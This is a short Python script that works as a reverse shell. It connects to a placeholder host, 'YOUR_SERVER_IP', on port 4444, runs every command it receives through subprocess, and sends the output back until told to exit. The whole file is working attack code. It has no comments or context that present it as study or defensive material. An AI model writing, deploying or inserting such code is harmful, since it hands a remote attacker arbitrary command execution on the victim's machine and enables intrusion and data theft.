import socket
import subprocess

client = socket.socket()
client.connect(("YOUR_SERVER_IP", 4444))

while True:
    command = client.recv(1024).decode()
    if command.lower() == "exit":
        break
    output = subprocess.getoutput(command)
    client.send(output.encode())
